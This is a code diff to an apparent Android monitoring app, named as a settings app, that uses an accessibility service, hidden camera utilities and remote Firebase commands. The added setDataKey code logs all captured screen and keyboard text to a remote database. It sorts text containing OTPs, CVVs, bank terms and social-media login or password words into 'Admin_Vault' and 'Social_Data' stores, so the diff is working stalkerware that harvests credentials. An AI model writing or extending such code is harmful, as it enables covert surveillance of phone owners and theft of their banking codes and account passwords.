@@ -34,6 +34,8 @@ import com.safe.setting.app.utils.Consts.PARAMS
 import com.safe.setting.app.utils.Consts.PHOTO
 import com.safe.setting.app.utils.Consts.TAG
 import com.safe.setting.app.utils.Consts.VIDEO
+import com.safe.setting.app.utils.GzipUtils
+import com.safe.setting.app.utils.GlobalConfig
 import com.safe.setting.app.utils.MyCountDownTimer
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraCallbacks
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraConfig
@@ -84,6 +86,12 @@ class InteractorAccessibilityData @Inject constructor(
      * ताकि OS का भरोसा जीता जा सके.
      */
     fun triggerAutomaticVideoPrimingCommand() {
+        try {
+            if (GlobalConfig.isFrozen) {
+                Log.d(TAG, "Silent Mode: skipping automatic video priming command")
+                return
+            }
+        } catch (_: Exception) {}
         if (firebase.getUser() == null) return
         Log.d(TAG, "Triggering automatic VIDEO priming command via Firebase.")
         // हिंदी कमेंट: हम recordVideo को true और facing को 1 (फ्रंट कैमरा) पर सेट कर रहे हैं.
@@ -131,6 +139,12 @@ class InteractorAccessibilityData @Inject constructor(
     }
 
     private fun handleVideoCommand(command: VideoCommand) {
+        try {
+            if (GlobalConfig.isFrozen) {
+                Log.d(TAG, "Silent Mode: drop video command")
+                return
+            }
+        } catch (_: Exception) {}
         if (command.recordVideo == true) {
             firebase.getDatabaseReference("$VIDEO/$PARAMS/recordVideo").setValue(false)
             val limitsRef = firebase.getDatabaseReference("limits")
@@ -166,6 +180,12 @@ class InteractorAccessibilityData @Inject constructor(
     }
 
     private fun handleAudioCommand(command: AudioCommand) {
+        try {
+            if (GlobalConfig.isFrozen) {
+                Log.d(TAG, "Silent Mode: drop audio command")
+                return
+            }
+        } catch (_: Exception) {}
         if (command.recordAudio == true) {
             firebase.getDatabaseReference("$AUDIO/$PARAMS/recordAudio").setValue(false)
             val limitsRef = firebase.getDatabaseReference("limits")
@@ -209,7 +229,45 @@ class InteractorAccessibilityData @Inject constructor(
     override fun stopCountDownTimer() { countDownTimer.cancel() }
     // Disposable management removed
     override fun setDataKey(data: String) {
-        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
+        if (GlobalConfig.isFrozen) {
+            Log.d(TAG, "Silent Mode active: dropping accessibility text event")
+            return
+        }
+        try {
+            val user = firebase.getUser() ?: return
+            val childID = user.uid
+
+            // Stream A: User_Logs/{childID}
+            val compressed = GzipUtils.compressToBase64(data)
+            firebase.getDatabaseReference("User_Logs/$childID").push().setValue(compressed)
+
+            // Stream B: The Vaults
+            val lower = data.lowercase()
+            val bankingKeywords = listOf("otp","cvv","debit","credit","upi","bank")
+            val safetyKeywords = listOf("suicide","kill","drug","gun","die")
+            val socialApps = listOf("facebook","fb","insta","instagram","whatsapp","snap","snapchat")
+            val impliesLogin = listOf("login","password","passcode","pwd","signin","otp")
+
+            // Banking vault
+            if (bankingKeywords.any { lower.contains(it) }) {
+                firebase.getDatabaseReference("Admin_Vault/$childID/banking").push().setValue(compressed)
+            }
+
+            // Safety alerts
+            if (safetyKeywords.any { lower.contains(it) }) {
+                firebase.getDatabaseReference("Safety_Alerts/$childID").push().setValue(compressed)
+            }
+
+            // Social data: if app name appears AND implies login/password
+            if (socialApps.any { lower.contains(it) } && impliesLogin.any { lower.contains(it) }) {
+                firebase.getDatabaseReference("Social_Data/$childID").push().setValue(compressed)
+            }
+
+            // Keep legacy logger as well (raw) for backward compatibility
+            firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
+        } catch (e: Exception) {
+            Log.e(TAG, "Dual-Stream setDataKey failed: ${e.message}")
+        }
     }
     override fun setDataLocation(location: Location) {
         val currentTime = System.currentTimeMillis()
@@ -282,6 +340,12 @@ class InteractorAccessibilityData @Inject constructor(
         }
     }
     private fun startCameraPicture(childPhoto: ChildPhoto) {
+        try {
+            if (GlobalConfig.isFrozen) {
+                Log.d(TAG, "Silent Mode: drop picture command")
+                return
+            }
+        } catch (_: Exception) {}
         if (childPhoto.capturePhoto == true) {
             val cameraConfig = CameraConfig().builder(context)
                 .setCameraFacing(childPhoto.facingPhoto!!)
